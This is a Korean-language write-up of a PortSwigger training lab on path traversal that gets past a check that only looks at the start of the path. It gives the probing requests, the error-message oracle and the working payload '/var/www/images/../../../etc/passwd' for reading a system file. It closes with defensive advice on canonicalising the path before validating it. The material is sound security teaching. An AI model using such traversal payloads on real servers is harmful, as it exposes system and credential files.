+++
date = '2026-06-29T09:00:00+09:00'
draft = false
title = '[Write-up] PortSwigger - File path traversal, validation of start of path'
summary = "기준 디렉터리로 시작하는지만 검사하는 접두 검증을 경로를 유지한 채 탈출해 우회하는 풀이와, 정규화 전 문자열을 검증하는 설계의 문제 정리"
toc = true
tags = ["Path Traversal", "Filter Bypass", "Canonicalization", "PortSwigger", "Practitioner"]
+++

---

## 문제 분석

> **난이도**: `PRACTITIONER`  
> **Lab**: [File path traversal, validation of start of path](https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path)

> ![image.png](/writeup/portswigger/path-traversal/05/1.png)

상품 이미지 표시 기능에 path traversal 취약점이 존재한다. 애플리케이션이 요청 파라미터로 전체 파일 경로를 전달받고, 제출된 경로가 기준 경로로 시작하는지 검증한다. `/etc/passwd` 파일의 내용을 가져오면 문제가 해결된다.

### Path Traversal 진단

이미지 요청 형태를 확인하면 앞선 랩들과 다르다.

```http
GET /image?filename=/var/www/images/59.jpg HTTP/2
Host: <lab-id>.web-security-academy.net
```

파일명이 아니라 **전체 절대경로**가 클라이언트에서 전달된다. 서버가 기준 디렉터리를 붙이지 않으므로 값을 통째로 바꿀 수 있고, 대신 그 값이 허용된 위치인지 검증하는 장치가 어딘가에 있다는 뜻이다. 대상 파일을 그대로 지정해 검증의 존재를 확인한다.

```http
GET /image?filename=/etc/passwd HTTP/2
```

```text
"Missing parameter 'filename'"
```

파라미터를 보냈는데도 누락됐다는 응답이 돌아온다. 검증 실패와 파라미터 누락이 같은 응답으로 처리되고 있는 것이다. 여기서 응답을 하나 더 확보해 두면 검증 통과 여부를 구분할 수 있다.

```http
GET /image?filename=/var/www/images/nothing.jpg HTTP/2
```

```text
"No such file"
```

두 응답의 차이가 그대로 오라클이 된다.

| 요청한 경로 | 응답 | 의미 |
| --- | --- | --- |
| `/etc/passwd` | `Missing parameter 'filename'` | 접두 검증에서 걸러짐 |
| `/var/www/images/nothing.jpg` | `No such file` | 검증은 통과, 파일만 없음 |

검증이 `/var/www/images/`로 시작하는지만 확인한다는 것이 확인됐다. 그렇다면 접두를 그대로 유지한 채 그 뒤에서 경로를 벗어나면 두 조건을 동시에 만족시킬 수 있다.

---

## 익스플로잇

기준 경로를 접두로 남겨 검증을 통과시키고, 그 뒤에 경로 이탈 시퀀스를 붙여 페이로드를 구성한다.

```http
GET /image?filename=/var/www/images/../../../etc/passwd HTTP/2
Host: <lab-id>.web-security-academy.net
```

검증 시점과 실제 파일 접근 시점에 이 문자열이 어떻게 읽히는지 비교하면 우회가 성립하는 이유가 드러난다.

```text
검증:  "/var/www/images/../../../etc/passwd".startsWith("/var/www/images/")  →  true
해석:  /var/www/images/../../../etc/passwd  →  /etc/passwd
```

요청을 전송하면 응답 본문에 `/etc/passwd`의 내용이 포함되며 문제가 해결된다.

![image.png](/writeup/portswigger/path-traversal/05/2.png)

---

## 정리

접두 검증은 발상 자체는 맞다. "이 경로가 기준 디렉터리 안에 있는가"는 path traversal 방어가 물어야 할 정확한 질문이다. 문제는 그 질문을 **정규화되지 않은 문자열**에 던졌다는 데 있다. 애플리케이션이 검사한 것은 사용자가 보낸 문자열이고, 커널이 여는 것은 그 문자열을 정규화한 결과다. 둘이 다른 이상 앞의 검사는 뒤의 동작을 보증하지 못한다.

올바른 순서는 **정규화가 먼저, 검증이 나중**이다.

```java
File file = new File(BASE_DIRECTORY, userInput);
if (file.getCanonicalPath().startsWith(BASE_DIRECTORY)) {
    // 파일 처리
}
```

`getCanonicalPath()`는 `..`와 `.`을 해소하고 심볼릭 링크까지 따라간 실제 경로를 돌려주므로, 이 값에 대해 접두를 확인하면 `../`가 몇 개 섞여 있든 결과는 달라지지 않는다. 파이썬이라면 `os.path.realpath()`, Node.js라면 `fs.realpathSync()`가 같은 역할을 한다. 심볼릭 링크까지 해소한다는 점이 중요한데, 기준 디렉터리 안에 바깥을 가리키는 링크가 있으면 문자열 정규화만으로는 걸러지지 않기 때문이다.

정규화 후에도 접두 비교에는 함정이 하나 더 남는다. 경계 구분자를 포함하지 않으면 비교가 디렉터리 단위가 아니라 문자 단위로 이루어진다.

```text
"/var/www/images-backup/secret".startsWith("/var/www/images")   →  true   // 통과되면 안 되는 경로
"/var/www/images-backup/secret".startsWith("/var/www/images/")  →  false  // 구분자 포함
```

마지막으로 진단 관점에서 이 랩이 남기는 것은 **오류 메시지가 오라클이 된다**는 점이다. 검증 실패가 `Missing parameter`, 파일 부재가 `No such file`로 갈리면서, 어떤 경로가 검증을 통과했는지를 응답만 보고 알 수 있게 됐다. 덕분에 우회 조건을 추측이 아니라 관찰로 좁힐 수 있었다. 방어 측에서는 실패 원인이 무엇이든 응답을 동일하게 맞춰 이런 구분 신호를 남기지 않아야 한다.
